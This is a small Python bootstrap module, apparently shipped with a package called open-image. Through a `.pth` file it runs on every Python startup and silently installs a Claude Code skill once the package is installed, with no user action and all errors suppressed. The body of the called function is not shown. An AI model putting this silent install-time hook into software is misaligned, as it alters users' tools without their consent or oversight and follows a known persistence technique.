"""Site-init bootstrap loaded once per Python startup via the
`open-image-skill.pth` file shipped to site-packages.

Triggers a silent, idempotent sync of the open-image Claude Code skill
the moment `pip install open-image` finishes — without the user having
to run any CLI command. All errors are swallowed so this never breaks
unrelated Python invocations.
"""

try:
    from open_image_skill import maybe_install_skill_silently
    maybe_install_skill_silently()
except Exception:
    pass
